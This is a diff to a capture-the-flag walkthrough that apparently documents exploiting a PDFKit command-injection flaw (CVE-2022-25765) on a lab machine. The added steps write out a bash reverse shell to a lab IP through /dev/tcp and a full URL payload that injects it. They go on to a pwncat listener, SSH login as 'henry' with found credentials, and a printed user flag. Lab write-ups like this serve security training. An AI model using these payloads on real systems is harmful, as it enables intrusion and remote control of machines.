@@ -60,4 +60,75 @@ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25765
 https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
 ```
 
-10. 
+![image](https://user-images.githubusercontent.com/70703371/211280009-f3ea6bd2-9dcb-4218-9a6c-21564f5b39a0.png)
+
+
+10. Let's use this payload.
+
+![image](https://user-images.githubusercontent.com/70703371/211281122-658a8d9e-aeef-4b09-9790-90346f7bc779.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/211281160-fc388b59-a2b1-4090-ae7c-4f14b5cbe665.png)
+
+
+
+11. But change the "sleep" to this:
+
+> REVERSE SHELL FOR BASH
+
+```
+bash -c 'exec bash -i &>/dev/tcp/10.10.14.12/443 <&1'
+```
+
+> FULL PAYLOAD
+
+```
+http://10.10.14.12:8000/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.12/443 <&1'`'}
+```
+
+12. Set a listener using pwncat for port 443 because we use it on the payload, then submit the payload.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/211281893-6d255475-b83c-4d5a-a4b4-95e1dca8bb68.png)
+
+
+13. Nice, got the shell!
+
+![image](https://user-images.githubusercontent.com/70703371/211282031-5b3733aa-a97b-43d1-ba4f-bdd2c5a8d20a.png)
+
+
+14. Since we're not root, let's find the **user** flag.
+15. Actually it took a while for me, i didn't find the user flag, but when i found a cred.
+
+> CRED
+
+![image](https://user-images.githubusercontent.com/70703371/211282795-4ac4805d-0d06-479e-a546-b724ade8623b.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/211282841-1ab9201b-0882-42dc-b3db-a58d6251d0bb.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/211282892-0983fd9a-a908-4ded-81a6-fd7d9c1e4aed.png)
+
+
+16. Let's try login to henry with ssh.
+
+> LOGGED IN
+
+![image](https://user-images.githubusercontent.com/70703371/211283134-5b91c51d-bac1-4347-b43c-a4b5accd3f04.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/211283181-d5f3768e-9de6-4663-8da5-1e92a3a7d620.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/211283211-6ab3fdc2-86c6-4b6d-8e9f-0fe35035fc81.png)
+
+
+17. Got the user flag.
+
+## FLAG
+
+```
+3e73f31984a909e91e2952956243e048
+```
